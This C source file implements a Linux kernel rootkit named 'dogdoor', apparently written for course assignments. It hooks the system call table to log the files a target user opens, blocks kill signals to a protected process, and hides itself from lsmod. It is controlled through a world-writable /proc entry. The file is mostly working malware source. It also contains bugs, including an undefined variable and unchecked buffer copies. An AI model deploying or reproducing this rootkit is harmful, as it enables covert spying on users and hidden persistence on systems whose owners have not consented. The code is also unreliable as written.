#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");

#define	NAME_LEN	64
#define	FILE_COUNT	10

// For change systemcall vector
void **sctable;

// Targets
uid_t target_uid = -1;
pid_t target_pid = -1;
int is_display = 1;

char filenames[FILE_COUNT][NAME_LEN];
int filecount = 0;

// Original system call vector
asmlinkage int (*orig_sys_open)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);


/* Assignment 1
 * Tracking target user's opened file names
 */
void set_target_uid(uid_t target) {
	target_uid = target;
	filecount = 0;
}

void log_write(const char *filename) {
	int i = 0;

	if (filecount == FILE_COUNT) {
		for (i = 0; i < FILE_COUNT - 1; i++)
			strncpy(filenames[i], filenames[i + 1], NAME_LEN - 1);
		filecount--;
	}

	strcpy(filenames[filecount], filename);
	filecount++;
}

char * log_read(void) {
	char *buf = NULL;
	int i = 0, size = 0;

	for (i = 0; i < filecount; i++)
		size += strlen(filenames[i]);

	buf = kmalloc(size + filecount + 1, GFP_KERNEL);
	buf[0] = 0x0;

	for (i = 0; i < filecount; i++) {
		strcat(buf, filenames[i]);
		strcat(buf, "\n");
	}

	return buf;
}

/* Assignment 2
 * Prevent to kill target
 */
void set_target_pid(pid_t target) {
	target_pid = target;
}

/* Assignment 3
 * Toggle this module on lsmod
 */
void hide_module(void) {
	(&THIS_MODULE->list)->prev->next = (&THIS_MODULE->list)->next;
	(&THIS_MODULE->list)->next->prev = (&THIS_MODULE->list)->prev;
	is_display = 0;
}

void display_module(void) {
	(&THIS_MODULE->list)->prev->next = &THIS_MODULE->list;
	(&THIS_MODULE->list)->next->prev = &THIS_MODULE->list;
	is_display = 1;
}

/* Dogdoor system call vector
 */
asmlinkage int dogdoor_sys_open(const char __user *filename, int flags, umode_t mode) {
	char fname[NAME_LEN];
	uid_t uid;
	
	uid = get_current_user()->uid.val;
	if (uid == target_uid) {
		copy_from_user(fname, filename, NAME_LEN);
		log_write(fname);
	}
	return orig_sys_open(filename, flags, mode);
}

asmlinkage long dogdoor_sys_kill(pid_t pid, int sig) {
	if (pid == target_pid)
		return -1;
	return orig_sys_kill(pid, sig);
}

/* Proc file functions
 */
static int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0;
}

static int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0;
}

static ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) {
	char buf[996], *temp = NULL;
	ssize_t toread;

	buf[0] = 0x0;
	sprintf(buf, "Tracking uid: %d\nLog ---\n", target_uid);
	temp = log_read();
	strcat(buf, temp);
	sprintf(buf + strlen(buf), "--- end\n\nForbidden pid: %d\n\nDisplay: %d\n", target_pid, is_display);

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset;
	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT;

	kfree(temp);
	*offset = *offset + toread;
	return toread;
}

static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) {
	char buf[128];
	int detector = 0, param = 0;

	if (*offset != 0 || size > 128)
		return -EFAULT;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT;

	sscanf(buf, "%d %d", &detector, &param);
	switch(detector) {
	case 1:
		set_target_uid(param);
		break;
	case 2:
		set_target_pid(param);
		break;
	case 3:
		if (is_hide == param)
			break;

		if (param) hide_module();
		else display_module();
		break;
	}

	*offset = strlen(buf);
	return *offset;
}

static const struct file_operations dogdoor_fops = {
	.owner =	THIS_MODULE,
	.open =		dogdoor_proc_open,
	.read =		dogdoor_proc_read,
	.write =	dogdoor_proc_write,
	.llseek =	seq_lseek,
	.release =	dogdoor_proc_release,
};

/* Module init and exit
 */
static int __init dogdoor_init(void) {
	unsigned int level;
	pte_t *pte;

	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops);
	sctable = (void *)kallsyms_lookup_name("sys_call_table");
	orig_sys_open = sctable[__NR_open];
	orig_sys_kill = sctable[__NR_kill];

	pte = lookup_address((unsigned long)sctable, &level);
	if (pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;

	sctable[__NR_open] = dogdoor_sys_open;
	sctable[__NR_kill] = dogdoor_sys_kill;
	return 0;
}

static void __exit dogdoor_exit(void) {
	unsigned int level;
	pte_t *pte;
	
	display_module();
	remove_proc_entry("dogdoor", NULL);

	sctable[__NR_open] = orig_sys_open;
	sctable[__NR_kill] = orig_sys_kill;
	
	pte = lookup_address((unsigned long)sctable, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
